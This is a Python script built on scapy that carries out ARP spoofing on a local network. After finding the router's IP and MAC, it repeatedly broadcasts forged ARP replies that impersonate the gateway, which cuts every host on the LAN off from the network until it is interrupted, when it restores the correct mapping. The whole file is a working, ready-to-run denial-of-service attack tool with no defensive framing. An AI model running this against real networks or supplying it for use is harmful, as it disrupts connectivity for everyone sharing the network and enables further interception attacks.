from subprocess import *
import os
from scapy.all import *
import time

def get_mac(ip_addresses, interface):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addresses), iface=interface, timeout=20, inter=0.1, verbose=False)
    macs = []
    for s, r in ans:
        if not isinstance(ip_addresses, (list)):
            return [r[Ether].src, r[ARP].psrc]
        macs.append([r[Ether].src, r[ARP].psrc])
    return macs
def block_all(router_ip):
    send(ARP(op=2, pdst=broadcast_ip,psrc=router_ip, hwdst='ff:ff:ff:ff:ff:ff'), verbose=False)

def restore_all(router_ip, router_mac):
    send(ARP(op=2, pdst=broadcast_ip,psrc=router_ip, hwsrc=router_mac, hwdst='ff:ff:ff:ff:ff:ff'), verbose=False, count=3)



if __name__ == '__main__':
    if not os.geteuid() == 0:
        exit("\nPlease run as root\n")

    # To redirect the subprocess errors to system null to increase the performance
    DN = open(os.devnull, 'w')

    connection_info = Popen(('/sbin/ip','route'), stdout=PIPE, stderr=None)

    connection_info = connection_info.communicate()[0].split()

    router_ip = connection_info[connection_info.index('via')+1]

    interface = connection_info[connection_info.index('dev')+1]

    #Build the broadcast ip from the ip_prefix
    ip_prefix = [x for x in connection_info if '/' in x]
    ip_prefix = ip_prefix[0] if ip_prefix else None

    net_prefix = ip_prefix.split('/')[0].split('.')
    net_prefix_bits = (32-int(ip_prefix.split('/')[1]))/8
    for pos in range(net_prefix_bits):
        net_prefix[-(pos+1)] = 255
    broadcast_ip = '.'.join(map(str,net_prefix))

    print "Sending Request to get Router MAC Address..."
    router_mac = get_mac(router_ip, interface)[0]
    print "Got the MAC address and started poisoning!"
    print "Broadcasting to IP {}".format(broadcast_ip)

    while True:
        try:
            block_all(router_ip)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_all(router_ip, router_mac)
            print "\nRestored the connection for all hosts!"
            break